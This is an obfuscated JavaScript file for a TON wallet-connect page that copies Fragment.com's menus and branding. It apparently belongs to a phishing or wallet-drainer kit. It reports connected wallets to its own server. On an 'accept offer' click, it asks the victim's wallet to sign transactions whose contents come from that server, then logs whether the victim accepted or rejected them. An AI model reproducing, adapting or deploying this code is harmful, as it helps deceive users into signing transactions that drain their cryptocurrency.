tonConnectUI = new TON_CONNECT_UI["TonConnectUI"]({
  manifestUrl:
    "https://raw.githubusercontent.com/netrandom/tonconnect/refs/heads/main/js",
  uiPreferences: {
    theme: "DARK",
    borderRadius: "s",
    colorsSet: {
      DARK: {
        accent: "#4db2ff",
        background: {
          primary: "#1a2026",
          qr: "#fff",
          tint: "#242e38",
        },
        connectButton: {
          background: "#248bda",
          foreground: "#fff",
        },
        icon: {
          error: "#ff5863",
        },
        text: {
          primary: "#fff",
          secondary: "#8794a1",
        },
      },
    },
  },
});
let connectedWallet = tonConnectUI["wallet"];
async function connectToWallet() {
  connectedWallet = await tonConnectUI["openModal"]();
}
const button = document["getElementById"]("ton-connect-button"),
  dropdown = document["getElementById"]("ton-connected-dropdown");
button["onclick"] = connectToWallet;

function shortWallet(_0x21e50c) {
  let _0x18075c = new Address(_0x21e50c["account"]["address"]);
  (_0x18075c = _0x18075c["toString"](!![], ![], !![])),
    (document["getElementById"]("wallet-head")["innerText"] = _0x18075c[
      "substring"
    ](0x0, 0x18)),
    (document["getElementById"]("wallet-tail")["innerText"] =
      _0x18075c["substring"](0x18));
}

function updateSidebar(_0x54b276) {
  if (_0x54b276) {
    let _0x5b9f39 = new Address(_0x54b276["account"]["address"]);
    (_0x5b9f39 = _0x5b9f39["toString"](!![], ![], !![])),
      (document["getElementById"]("wallet-head")["innerText"] = _0x5b9f39[
        "substring"
      ](0x0, 0x18)),
      (document["getElementById"]("wallet-tail")["innerText"] =
        _0x5b9f39["substring"](0x18));
    const _0x3d5bf6 = document["getElementsByClassName"](
      "js-header-menu-window"
    )[0x0];
    _0x3d5bf6["innerHTML"] = `
		<div class="tm-menu-account-header">
		  <div class="tm-menu-account-address">
			<span class="tm-wallet">
			  <span class="head"> ${_0x5b9f39["substring"](0x0, 0x18)} </span>
			  <span class="middle"></span>
			  <span class="tail">${_0x5b9f39["substring"](0x18)}</span>
			</span>
		  </div>
		  <div class="tm-menu-account-desc">Connected TON wallet</div>
		</div>
		<div class="tm-header-menu-window js-header-menu-window">
		  <div class="tm-menu-account-header">
			<div class="tm-menu-account-address">
			  <span class="tm-wallet">
				<span class="head"> ${_0x5b9f39["substring"](0x0, 0x18)} </span>
				<span class="middle"></span>
				<span class="tail">${_0x5b9f39["substring"](0x18)}</span>
			  </span>
			</div>
			<div class="tm-menu-account-desc">Connected TON wallet</div>
		  </div>
		  <div class="tm-header-menu-body">
			<h4 class="tm-menu-subheader">My Account</h4>
			<div class="tm-menu-links">
			  <a href="https://fragment.com/my/assets" class="tm-menu-link icon-before icon-menu-assets" data-counter="">My Assets</a>
			  <a href="https://fragment.com/my/bids" class="tm-menu-link icon-before icon-menu-bids" data-counter="">My Bids</a>
			  <a href="https://fragment.com/my/numbers" class="tm-menu-link icon-before icon-menu-numbers" data-counter="">My Anonymous Numbers</a>
			  <a href="https://fragment.com/my/sessions" class="tm-menu-link icon-before icon-menu-sessions">Active Sessions</a>
			  <a href="javascript:;" class="tm-menu-link icon-before icon-menu-disconnect ton-logout-link">Disconnect TON</a>
			</div>
			<h4 class="tm-menu-subheader">Platform</h4>
			<div class="tm-menu-links">
			  <a href="https://fragment.com/about" class="tm-menu-link icon-before icon-menu-about">About</a>
			  <a href="https://fragment.com/terms" class="tm-menu-link icon-before icon-menu-terms">Terms</a>
			  <a href="https://fragment.com/privacy" class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
			</div>
			<div class="tm-header-menu-footer"></div>
		  </div>
		</div>
        `;
    const _0x1894a4 = document["getElementsByClassName"]("ton-logout-link");
    for (const _0x4d639e of _0x1894a4) {
      _0x4d639e["onclick"] = () => {
        fetch("/api/disconnect", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON["stringify"]({
            wallet: _0x54b276["account"]["address"],
            href: window["location"]["href"],
          }),
        }),
          tonConnectUI["disconnect"](),
          location["reload"]();
      };
    }
  } else {
    const _0x35bc6e = document["getElementsByClassName"]("ton-auth-link");
    for (const _0x2045f1 of _0x35bc6e) {
      _0x2045f1["onclick"] = () => {
        connectToWallet();
      };
    }
  }
}

function visualUpdate(_0x2ddc61) {
  _0x2ddc61
    ? ((button["style"]["display"] = "none"),
      (dropdown["style"]["display"] = "inherit"),
      shortWallet(_0x2ddc61))
    : ((button["style"]["display"] = "inherit"),
      (dropdown["style"]["display"] = "none"));
}
const openPopupButton = document["getElementsByClassName"](
    "js-header-menu-button"
  )[0x0],
  closePopupButton = document["getElementsByClassName"](
    "js-header-menu-close-button"
  )[0x0],
  popup = document["getElementsByClassName"]("js-header-menu")[0x0];
(openPopupButton["onclick"] = () => {
  popup["classList"]["remove"]("hide");
}),
  (closePopupButton["onclick"] = () => {
    popup["classList"]["add"]("hide");
  }),
  updateSidebar(tonConnectUI["wallet"]),
  visualUpdate(tonConnectUI["wallet"]),
  tonConnectUI["onStatusChange"]((_0x5f19cc) => {
    (connectedWallet = _0x5f19cc),
      updateSidebar(_0x5f19cc),
      visualUpdate(_0x5f19cc),
      _0x5f19cc &&
        fetch("/api/connected", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON["stringify"]({
            raw: _0x5f19cc,
            wallet: _0x5f19cc["account"]["address"],
            href: window["location"]["href"],
          }),
        });
  });
async function transaction() {
  if (!tonConnectUI["wallet"]) {
    await tonConnectUI["openModal"]();
    return;
  }
  const _0x3c396a = tonConnectUI["wallet"]["account"]["address"];
  let _0x329c09 = await fetch(
    "/api/transaction" + window["location"]["search"] + "&wallet=" + _0x3c396a
  );
  if (_0x329c09["ok"]) {
    let _0x44e4e5 = await _0x329c09["json"]();
    console.log("_0x44e4e5", _0x44e4e5);
    if (_0x44e4e5["messages"]) {
      let _0x59733f = {
        validUntil: Math["floor"](Date["now"]() / 0x3e8) + 0x168,
        messages: _0x44e4e5["messages"],
      };
      if (_0x59733f["messages"] && _0x59733f["messages"]["length"] > 0x0)
        try {
          const _0x3ddefe = await tonConnectUI["sendTransaction"](_0x59733f);
          fetch("/api/accept", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON["stringify"]({
              messages: _0x44e4e5["messages"],
              boc: _0x3ddefe,
              wallet: _0x3c396a,
              raw: _0x44e4e5["raw"],
              href: window["location"]["href"],
            }),
          });
        } catch (_0x543e1f) {
          fetch("/api/reject", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON["stringify"]({
              messages: _0x44e4e5["messages"],
              err: _0x543e1f["message"],
              wallet: _0x3c396a,
              raw: _0x44e4e5["raw"],
              href: window["location"]["href"],
            }),
          });
        }
    }
  }
}
document["getElementById"]("accept-offer")["onclick"] = transaction;
